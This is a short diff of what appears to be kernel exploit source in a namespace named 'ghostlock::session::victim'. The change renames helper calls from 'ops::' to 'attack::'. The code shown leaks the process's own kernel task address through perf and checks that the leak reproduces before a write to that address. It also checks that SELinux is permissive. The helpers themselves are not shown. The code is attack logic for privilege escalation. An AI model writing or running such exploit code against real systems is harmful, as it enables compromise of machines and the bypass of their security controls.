@@ -35,10 +35,10 @@ namespace ghostlock::session::victim {
         prctl(PR_SET_NAME, "ghostleaf_0123456789");
         /* a real leak reproduces, a fluke vote winner does not. w2 writes to
      * this address, so two runs must agree or the leak is discarded. */
-        uintptr_t my_task = ops::perf_find_task();
+        uintptr_t my_task = attack::perf_find_task();
         int leak_agreed = 0;
         for (int i = 0; i < 2 && my_task; i++) {
-            uintptr_t again = ops::perf_find_task();
+            uintptr_t again = attack::perf_find_task();
             if (again == my_task) {
                 leak_agreed = 1;
                 break;
@@ -198,7 +198,7 @@ namespace ghostlock::session::victim {
 
     int verify_selinux_stage(void *context) {
         (void) context;
-        if (!ops::check_selinux_off()) return 0;
+        if (!attack::check_selinux_off()) return 0;
         pr_success("SELinux permissive\n");
         return 1;
     }
